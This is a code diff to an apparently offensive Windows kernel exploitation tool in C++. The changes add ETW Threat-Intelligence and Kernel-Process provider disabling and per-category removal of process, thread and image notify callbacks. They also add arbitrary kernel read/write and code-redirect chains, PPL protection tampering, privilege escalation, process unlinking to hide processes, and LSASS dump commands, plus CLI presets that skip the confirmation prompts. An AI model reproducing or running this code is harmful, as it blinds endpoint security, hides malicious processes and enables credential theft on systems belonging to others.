@@ -43,6 +43,7 @@ typedef LONG NTSTATUS;
 #include "Offsets.h"
 #include "GadgetDiscovery.h"
 #include "GadgetChaining.h"
+#include "EtwDisable.h"
 
 // ASCII Art Logo
 void PrintLogo() {
@@ -264,7 +265,20 @@ public:
         std::cout << std::endl;
     }
     
-    bool ExecuteChain(const std::string& chainName) {
+    bool ExecuteChain(const std::string& chainName,
+                     uint32_t presetPrivPid = 0,
+                     bool promptConfirm = true,
+                     bool promptRestore = true,
+                     uint32_t presetPplPid = 0,
+                     uint8_t presetPplProt = 0,
+                     size_t presetSecurityChoice = 0,
+                     uint64_t presetWriteAddr = 0,
+                     uint64_t presetWriteVal = 0,
+                     uint64_t presetReadAddr = 0,
+                     size_t presetReadSize = 0,
+                     uint64_t presetCodeTarget = 0,
+                     uint32_t presetUnlinkPid = 0,
+                     uint32_t presetSuspendPid = 0) {
         ExploitGoal goal;
         uint32_t unlinkPid = 0;
         uint32_t privPid = 0;
@@ -284,10 +298,12 @@ public:
         } else if (chainName == "unlink") {
             goal = ExploitGoal::UNLINK_PROCESS;
         } else if (chainName == "suspend") {
-            std::cout << "[?] What PID do you want to suspend? " << std::endl;
-            uint32_t pid = 0;
-            std::cin >> pid;
-            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            uint32_t pid = presetSuspendPid;
+            if (pid == 0) {
+                std::cout << "[?] What PID do you want to suspend? " << std::endl;
+                std::cin >> pid;
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            }
             return SuspendProcess(pid);
         } else if (chainName == "lsass") {
             // handled directly (dump)
@@ -301,56 +317,109 @@ public:
         
         GadgetChain chain;
         if (goal == ExploitGoal::BYPASS_PPL) {
-            std::cout << "[?] What PID number you want to use? " << std::endl;
             uint32_t pidInput = 0;
-            std::cin >> pidInput;
-            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
-
-            std::cout << "[?] Select the new PPL level for this process:" << std::endl;
-            std::cout << "1) PROTECTION_LEVEL_WINTCB_LIGHT" << std::endl;
-            std::cout << "2) PROTECTION_LEVEL_WINDOWS" << std::endl;
-            std::cout << "3) PROTECTION_LEVEL_WINDOWS_LIGHT" << std::endl;
-            std::cout << "4) PROTECTION_LEVEL_ANTIMALWARE_LIGHT" << std::endl;
-            std::cout << "5) PROTECTION_LEVEL_LSA_LIGHT" << std::endl;
-            std::cout << "6) PROTECTION_LEVEL_WINTCB" << std::endl;
-            std::cout << "7) PROTECTION_LEVEL_CODEGEN_LIGHT" << std::endl;
-            std::cout << "8) PROTECTION_LEVEL_AUTHENTICODE" << std::endl;
-            std::cout << "9) PROTECTION_LEVEL_PPL_APP" << std::endl;
-            std::cout << "0) PROTECTION_LEVEL_NONE" << std::endl;
-            std::cout << "> ";
-            std::string sel;
-            std::getline(std::cin, sel);
             uint8_t protVal = 0;
-            if (!sel.empty()) {
-                switch (sel[0]) {
-                case '1': protVal = 0x61; break; // WINTCB_LIGHT (Signer=WinTcb, Type=ProtectedLight)
-                case '2': protVal = 0x52; break; // WINDOWS (Signer=Windows, Type=Protected)
-                case '3': protVal = 0x51; break; // WINDOWS_LIGHT (Signer=Windows, Type=ProtectedLight)
-                case '4': protVal = 0x31; break; // ANTIMALWARE_LIGHT (Signer=Antimalware, Type=ProtectedLight)
-                case '5': protVal = 0x41; break; // LSA_LIGHT (Signer=Lsa, Type=ProtectedLight)
-                case '6': protVal = 0x62; break; // WINTCB (Signer=WinTcb, Type=Protected)
-                case '7': protVal = 0x21; break; // CODEGEN_LIGHT (Signer=CodeGen, Type=ProtectedLight)
-                case '8': protVal = 0x12; break; // AUTHENTICODE (Signer=Authenticode, Type=Protected)
-                case '9': protVal = 0x81; break; // PPL_APP (Signer=App, Type=ProtectedLight)
-                case '0': default: protVal = 0x00; break; // NONE
+
+            if (presetPplPid != 0) {
+                pidInput = presetPplPid;
+                protVal = presetPplProt;
+            } else {
+                std::cout << "[?] What PID number you want to use? " << std::endl;
+                std::cin >> pidInput;
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+
+                std::cout << "[?] Select the new PPL level for this process:" << std::endl;
+                std::cout << "1) PROTECTION_LEVEL_WINTCB_LIGHT" << std::endl;
+                std::cout << "2) PROTECTION_LEVEL_WINDOWS" << std::endl;
+                std::cout << "3) PROTECTION_LEVEL_WINDOWS_LIGHT" << std::endl;
+                std::cout << "4) PROTECTION_LEVEL_ANTIMALWARE_LIGHT" << std::endl;
+                std::cout << "5) PROTECTION_LEVEL_LSA_LIGHT" << std::endl;
+                std::cout << "6) PROTECTION_LEVEL_WINTCB" << std::endl;
+                std::cout << "7) PROTECTION_LEVEL_CODEGEN_LIGHT" << std::endl;
+                std::cout << "8) PROTECTION_LEVEL_AUTHENTICODE" << std::endl;
+                std::cout << "9) PROTECTION_LEVEL_PPL_APP" << std::endl;
+                std::cout << "0) PROTECTION_LEVEL_NONE" << std::endl;
+                std::cout << "> ";
+                std::string sel;
+                std::getline(std::cin, sel);
+                if (!sel.empty()) {
+                    switch (sel[0]) {
+                    case '1': protVal = 0x61; break; // WINTCB_LIGHT
+                    case '2': protVal = 0x52; break; // WINDOWS
+                    case '3': protVal = 0x51; break; // WINDOWS_LIGHT
+                    case '4': protVal = 0x31; break; // ANTIMALWARE_LIGHT
+                    case '5': protVal = 0x41; break; // LSA_LIGHT
+                    case '6': protVal = 0x62; break; // WINTCB
+                    case '7': protVal = 0x21; break; // CODEGEN_LIGHT
+                    case '8': protVal = 0x12; break; // AUTHENTICODE
+                    case '9': protVal = 0x81; break; // PPL_APP
+                    case '0': default: protVal = 0x00; break; // NONE
+                    }
                 }
             }
             chain = chaining->FindPPLBypassChain(pidInput, protVal);
         } else if (goal == ExploitGoal::PRIVILEGE_ESCALATION) {
-            std::cout << "[?] What PID should be elevated? (blank = self) " << std::endl;
-            std::string line;
-            std::getline(std::cin, line);
-            if (line.empty()) {
-                privPid = GetCurrentProcessId();
+            if (presetPrivPid) {
+                privPid = presetPrivPid;
             } else {
-                privPid = static_cast<uint32_t>(std::strtoul(line.c_str(), nullptr, 0));
+                std::cout << "[?] What PID should be elevated? (blank = self) " << std::endl;
+                std::string line;
+                std::getline(std::cin, line);
+                if (line.empty()) {
+                    privPid = GetCurrentProcessId();
+                } else {
+                    privPid = static_cast<uint32_t>(std::strtoul(line.c_str(), nullptr, 0));
+                }
             }
             chain = chaining->FindPrivilegeEscalationChain(privPid);
         } else if (goal == ExploitGoal::UNLINK_PROCESS) {
-            std::cout << "[?] What PID should be unlinked? " << std::endl;
-            std::cin >> unlinkPid;
+            if (presetUnlinkPid) {
+                unlinkPid = presetUnlinkPid;
+            } else {
+                std::cout << "[?] What PID should be unlinked? " << std::endl;
+                std::cin >> unlinkPid;
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            }
             chain = chaining->FindUnlinkProcessChain(unlinkPid);
-            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+        } else if (goal == ExploitGoal::ARBITRARY_WRITE) {
+            if (presetWriteAddr) {
+                chain = chaining->FindArbitraryWriteChain(presetWriteAddr, presetWriteVal);
+            } else {
+                std::cout << "[?] Target kernel address to write: ";
+                std::string addrStr, valStr;
+                std::getline(std::cin, addrStr);
+                std::cout << "[?] Value to write (hex or dec): ";
+                std::getline(std::cin, valStr);
+                uint64_t addr = addrStr.empty() ? 0 : _strtoui64(addrStr.c_str(), nullptr, 0);
+                uint64_t val = valStr.empty() ? 0 : _strtoui64(valStr.c_str(), nullptr, 0);
+                chain = chaining->FindArbitraryWriteChain(addr, val);
+            }
+        } else if (goal == ExploitGoal::ARBITRARY_READ) {
+            if (presetReadAddr && presetReadSize) {
+                chain = chaining->FindArbitraryReadChain(presetReadAddr, presetReadSize);
+            } else {
+                std::cout << "[?] Target kernel address to read: ";
+                std::string addrStr, sizeStr;
+                std::getline(std::cin, addrStr);
+                std::cout << "[?] Number of bytes to read: ";
+                std::getline(std::cin, sizeStr);
+                uint64_t addr = addrStr.empty() ? 0 : _strtoui64(addrStr.c_str(), nullptr, 0);
+                size_t sz = sizeStr.empty() ? 0 : static_cast<size_t>(_strtoui64(sizeStr.c_str(), nullptr, 0));
+                chain = chaining->FindArbitraryReadChain(addr, sz);
+            }
+        } else if (goal == ExploitGoal::CODE_EXECUTION_REDIRECT) {
+            uint64_t target = presetCodeTarget;
+            if (!target) {
+                if (const char* env = std::getenv("DOG_REDIRECT_TARGET")) {
+                    target = _strtoui64(env, nullptr, 0);
+                } else {
+                    std::cout << "[?] Target address to redirect to: ";
+                    std::string tStr;
+                    std::getline(std::cin, tStr);
+                    target = tStr.empty() ? 0 : _strtoui64(tStr.c_str(), nullptr, 0);
+                }
+            }
+            chain = chaining->FindCodeRedirectChain(target);
         } else if (goal == ExploitGoal::DISABLE_SECURITY) {
             // Build simple categories from discovered gadgets
             struct Cat {
@@ -369,9 +438,13 @@ public:
                 if (!gadget.is_writable) continue;
                 switch (gadget.type) {
                 case GadgetType::PROCESS_CALLBACK:
+                    ensure("Process", false).addrs.push_back(addr);
+                    break;
                 case GadgetType::THREAD_CALLBACK:
+                    ensure("Thread", false).addrs.push_back(addr);
+                    break;
                 case GadgetType::IMAGE_CALLBACK:
-                    ensure("Process/Thread/Image", false).addrs.push_back(addr);
+                    ensure("Image", false).addrs.push_back(addr);
                     break;
                 case GadgetType::MINIFILTER_CALLBACK:
                     ensure("Minifilter", true).addrs.push_back(addr);
@@ -388,6 +461,30 @@ public:
                 }
             }
 
+            // Synthetic provider-based category (Kernel-Process ETW)
+            ensure("Kernel Provider Log", false).addrs.push_back(0); // placeholder count
+
+            // Reorder categories to match desired menu
+            std::vector<std::string> order = {
+                "ETW/TI",
+                "Kernel Provider Log",
+                "Process",
+                "Thread",
+                "Image",
+                "Minifilter",
+                "Bugcheck/Shutdown"
+            };
+            std::vector<Cat> ordered;
+            for (auto& name : order) {
+                for (auto& c : cats) {
+                    if (c.name == name) {
+                        ordered.push_back(c);
+                        break;
+                    }
+                }
+            }
+            cats = ordered;
+
             if (cats.empty()) {
                 std::cout << "[!] No writable security callbacks found" << std::endl;
                 return false;
@@ -397,9 +494,12 @@ public:
             std::cout << "[*] Callback groups summary:" << std::endl;
             for (auto& c : cats) {
                 std::string desc;
-                if (c.name == "Process/Thread/Image")       desc = "Ps* notify routines and arrays (Psp*)";
+                if (c.name == "Process")                    desc = "PsCreateProcessNotifyRoutine entries";
+                else if (c.name == "Thread")                desc = "PsCreateThreadNotifyRoutine entries";
+                else if (c.name == "Image")                 desc = "PsLoadImageNotifyRoutine entries";
                 else if (c.name == "Minifilter")            desc = "FltRegisterFilter callbacks";
                 else if (c.name == "ETW/TI")                desc = "EtwTiLogReadWriteVm consumer callbacks";
+                else if (c.name == "Kernel Provider Log")   desc = "Microsoft-Windows-Kernel-Process EnableInfo";
                 else                                        desc = "Bugcheck/Shutdown notifications";
 
                 std::cout << "    - " << c.name << ": " << desc
@@ -415,14 +515,17 @@ public:
                           << " [" << cats[i].addrs.size() << "] "
                           << (cats[i].documented ? "(documented)" : "(undocumented)") << std::endl;
             }
-            size_t all_no_symbol_idx = cats.size() + 1;
-            size_t all_idx = cats.size() + 2;
-            std::cout << "  " << all_no_symbol_idx << ") All besides symbol-based" << std::endl;
+            size_t all_idx = cats.size() + 1;
             std::cout << "  " << all_idx << ") All groups" << std::endl;
 
             size_t choice = 0;
-            std::cin >> choice;
-            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            if (presetSecurityChoice) {
+                choice = presetSecurityChoice;
+                std::cout << "[*] Using preset selection: " << choice << std::endl;
+            } else {
+                std::cin >> choice;
+                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+            }
             if (choice == 0) {
                 std::cout << "[*] Cancelled." << std::endl;
                 return false;
@@ -432,23 +535,33 @@ public:
                 return false;
             }
 
+            if (choice <= cats.size() && cats[choice - 1].name == "ETW/TI") {
+                bool tiOk = DisableTiEtwProvider(rw.get());
+                std::cout << "[*] ETW/TI disable summary: TI=" << (tiOk ? "cleared" : "no change") << std::endl;
+                if (!tiOk) std::cout << "[!] ETW disable: no TI sessions cleared" << std::endl;
+                return tiOk;
+            }
+            if (choice <= cats.size() && cats[choice - 1].name == "Kernel Provider Log") {
+                bool kpOk = DisableKernelProcessEtwProvider(rw.get());
+                std::cout << "[*] Kernel Provider disable summary: " << (kpOk ? "cleared" : "no change") << std::endl;
+                if (!kpOk) std::cout << "[!] Kernel Provider: no sessions cleared" << std::endl;
+                return kpOk;
+            }
+
             std::vector<uint64_t> targets;
-            auto is_symbol = [&](uint64_t addr) -> bool {
-                auto it = discoveredGadgets.find(addr);
-                if (it == discoveredGadgets.end()) return false;
-                const auto& g = it->second;
-                return (!g.name.empty() && g.name.rfind("Symbol_", 0) == 0) ||
-                       (!g.type_name.empty() && g.type_name.rfind("Symbol_", 0) == 0);
-            };
 
             if (choice == all_idx) {
-                for (auto& c : cats) targets.insert(targets.end(), c.addrs.begin(), c.addrs.end());
-            } else if (choice == all_no_symbol_idx) {
                 for (auto& c : cats) {
-                    for (auto a : c.addrs) {
-                        if (!is_symbol(a)) targets.push_back(a);
-                    }
+                    if (c.name == "ETW/TI" || c.name == "Kernel Provider Log") continue;
+                    targets.insert(targets.end(), c.addrs.begin(), c.addrs.end());
                 }
+                // attempt both providers when selecting all
+                bool tiOk = DisableTiEtwProvider(rw.get());
+                bool kpOk = DisableKernelProcessEtwProvider(rw.get());
+                std::cout << "[*] ETW/TI disable summary: TI=" << (tiOk ? "cleared" : "no change")
+                          << " Kernel-Process=" << (kpOk ? "cleared" : "no change") << std::endl;
+                if (!tiOk) std::cout << "[!] ETW disable: no TI sessions cleared" << std::endl;
+                if (!kpOk) std::cout << "[!] Kernel Provider: no sessions cleared" << std::endl;
             } else {
                 targets = cats[choice - 1].addrs;
             }
@@ -483,12 +596,49 @@ public:
         std::cout << "[*] Found chain: " << chain.description << std::endl;
         chaining->PrintChain(chain);
         
-        std::cout << "[?] Execute this chain? (y/n): ";
-        char response;
-        std::cin >> response;
+        bool doExecute = true;
+        char response = 'n';
+        if (promptConfirm) {
+            std::cout << "[?] Execute this chain? (y/n): ";
+            std::cin >> response;
+            doExecute = (response == 'y' || response == 'Y');
+        }
         
-        if (response == 'y' || response == 'Y') {
-            bool success = chaining->ExecuteChain(chain);
+        if (doExecute) {
+            bool success = false;
+
+            if (goal == ExploitGoal::ARBITRARY_READ) {
+                success = true;
+                for (auto& dep : chain.dependencies) {
+                    uint64_t addr = dep.first;
+                    size_t sz = static_cast<size_t>(dep.second);
+                    std::vector<uint8_t> buf(sz);
+                    if (!rw->ReadMemory(addr, buf.data(), sz)) {
+                        std::cout << "[-] Read failed at 0x" << std::hex << addr << std::dec << std::endl;
+                        success = false;
+                        break;
+                    }
+                    std::cout << "[+] Read " << sz << " bytes from 0x" << std::hex << addr << std::dec << ": ";
+                    size_t show = std::min<size_t>(sz, 64);
+                    for (size_t i = 0; i < show; ++i) {
+                        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)buf[i] << " ";
+                    }
+                    if (show < sz) std::cout << "...";
+                    std::cout << std::dec << std::setfill(' ') << std::endl;
+                }
+            } else if (goal == ExploitGoal::ARBITRARY_WRITE ||
+                       goal == ExploitGoal::CODE_EXECUTION_REDIRECT ||
+                       goal == ExploitGoal::DISABLE_SECURITY) {
+                success = true;
+                for (auto& kv : chain.new_values) {
+                    if (!rw->Write<uint64_t>(kv.first, kv.second)) {
+                        std::cout << "[-] Write failed at 0x" << std::hex << kv.first << std::dec << std::endl;
+                        success = false;
+                    }
+                }
+            } else {
+                success = chaining->ExecuteChain(chain);
+            }
             
             if (success) {
                 std::cout << "[+] Chain executed successfully!" << std::endl;
@@ -523,18 +673,20 @@ public:
                 _pclose(pipe);
             }
             std::cout << "[*] tasklist check for PID " << unlinkPid << ": "
-                      << (found ? "still listed (unlink may have failed)" : "not listed (unlinked/hidden)")
+                      << (found ? "still listed (unlink may have failed)" : "is now unlisted (unlinked/hidden)")
                       << std::endl;
         }
             } else {
                 std::cout << "[!] Chain execution failed!" << std::endl;
             }
             
-            std::cout << "[?] Restore original values? (y/n): ";
-            std::cin >> response;
-            
-            if (response == 'y' || response == 'Y') {
-                chaining->RestoreChain(chain);
+            if (promptRestore && goal != ExploitGoal::ARBITRARY_READ) {
+                std::cout << "[?] Restore original values? (y/n): ";
+                std::cin >> response;
+                
+                if (response == 'y' || response == 'Y') {
+                    chaining->RestoreChain(chain);
+                }
             }
             
             return success;
@@ -664,7 +816,7 @@ public:
         std::cout << "Available commands:" << std::endl;
         std::cout << "  discover           - Run full gadget discovery" << std::endl;
         std::cout << "  chains             - Show available exploit chains" << std::endl;
-        std::cout << "  exec <chain>       - Execute chain (priv, ppl, security, read, write, code, unlink, lsass, suspend)" << std::endl;
+        std::cout << "  exec <chain>       - Execute chain (priv, ppl, security, read, write, code, unlink, lsass, lsassmd, suspend)" << std::endl;
         std::cout << "  raw2dmp            - Convert lsass_dtb.raw to a minidump" << std::endl;
         std::cout << "  list               - List discovered gadgets" << std::endl;
         std::cout << "  stats              - Show discovery statistics" << std::endl;
@@ -1474,6 +1626,9 @@ int main() {
     bool usePhysmem = false;
     std::string command;
     std::string commandArg;
+    std::string commandArg2;
+    std::string commandArg3;
+    std::vector<std::string> positionalArgs;
     bool enablePatternScan = false;
     bool enableCrossRefs = false;
     bool enableValidation = false;
@@ -1513,11 +1668,19 @@ int main() {
             enableValidation = true;
         } else if (command.empty() && arg.rfind("--", 0) != 0) {
             command = arg;
-            // optional following token (e.g., chain name)
-            if (i + 1 < __argc && __argv[i + 1][0] != '-') {
-                commandArg = __argv[i + 1];
-            }
+        } else if (!command.empty() && arg.rfind("--", 0) != 0) {
+            positionalArgs.push_back(arg);
         }
+    }
+
+    if (!positionalArgs.empty()) {
+        commandArg = positionalArgs[0];
+    }
+    if (positionalArgs.size() > 1) {
+        commandArg2 = positionalArgs[1];
+    }
+    if (positionalArgs.size() > 2) {
+        commandArg3 = positionalArgs[2];
     }
 
     // Choose R/W primitive (driver required)
@@ -1543,9 +1706,66 @@ int main() {
             tool.ExportGadgets("gadgets.json");
         }
         else if (command == "exec" && !commandArg.empty()) {
+            uint32_t cliPrivPid = 0;
+            size_t cliSecurityChoice = 0;
+            uint64_t cliWriteAddr = 0, cliWriteVal = 0;
+            uint64_t cliReadAddr = 0; size_t cliReadSize = 0;
+            uint64_t cliCodeTarget = 0;
+            uint32_t cliUnlinkPid = 0;
+            uint32_t cliSuspendPid = 0;
+            if ((commandArg == "priv" || commandArg == "privilege") && !commandArg2.empty()) {
+                cliPrivPid = static_cast<uint32_t>(strtoul(commandArg2.c_str(), nullptr, 0));
+            }
+            if ((commandArg == "security" || commandArg == "disable") && !commandArg2.empty()) {
+                cliSecurityChoice = static_cast<size_t>(strtoul(commandArg2.c_str(), nullptr, 0));
+            }
+            if (commandArg == "write" && !commandArg2.empty() && !commandArg3.empty()) {
+                cliWriteAddr = _strtoui64(commandArg2.c_str(), nullptr, 0);
+                cliWriteVal  = _strtoui64(commandArg3.c_str(), nullptr, 0);
+            }
+            if (commandArg == "read" && !commandArg2.empty() && !commandArg3.empty()) {
+                cliReadAddr = _strtoui64(commandArg2.c_str(), nullptr, 0);
+                cliReadSize = static_cast<size_t>(_strtoui64(commandArg3.c_str(), nullptr, 0));
+            }
+            if ((commandArg == "code" || commandArg == "redirect") && !commandArg2.empty()) {
+                cliCodeTarget = _strtoui64(commandArg2.c_str(), nullptr, 0);
+            }
+            if (commandArg == "unlink" && !commandArg2.empty()) {
+                cliUnlinkPid = static_cast<uint32_t>(strtoul(commandArg2.c_str(), nullptr, 0));
+            }
+            if (commandArg == "suspend" && !commandArg2.empty()) {
+                cliSuspendPid = static_cast<uint32_t>(strtoul(commandArg2.c_str(), nullptr, 0));
+            }
             tool.RunFullDiscovery();
             tool.ShowChains();
-            tool.ExecuteChain(commandArg);
+            if (cliPrivPid) {
+                tool.ExecuteChain(commandArg, cliPrivPid, false, false);
+            } else if (cliSecurityChoice) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, cliSecurityChoice);
+            } else if (cliWriteAddr) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, 0, cliWriteAddr, cliWriteVal);
+            } else if (cliReadAddr && cliReadSize) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, 0, 0, 0, cliReadAddr, cliReadSize);
+            } else if (cliCodeTarget) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, 0, 0, 0, 0, 0, cliCodeTarget, 0, 0);
+            } else if (cliUnlinkPid) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, 0, 0, 0, 0, 0, 0, cliUnlinkPid, 0);
+            } else if (cliSuspendPid) {
+                tool.ExecuteChain(commandArg, 0, false, false, 0, 0, 0, 0, 0, 0, 0, 0, 0, cliSuspendPid);
+            } else {
+                tool.ExecuteChain(commandArg, 0, false, false);
+            }
+        }
+        else if (command == "ppl") {
+            if (commandArg.empty() || commandArg2.empty()) {
+                std::cout << "Usage: " << __argv[0] << " ppl <pid> <prot> [driver args...]" << std::endl;
+                return 1;
+            }
+            uint32_t cliPplPid = static_cast<uint32_t>(strtoul(commandArg.c_str(), nullptr, 0));
+            uint8_t cliPplProt = static_cast<uint8_t>(strtoul(commandArg2.c_str(), nullptr, 0));
+            tool.RunFullDiscovery();
+            tool.ShowChains();
+            tool.ExecuteChain("ppl", 0, false, false, cliPplPid, cliPplProt);
         }
         else if (command == "raw2dmp") {
             std::string in = commandArg.empty() ? "lsass_dtb.raw" : commandArg;
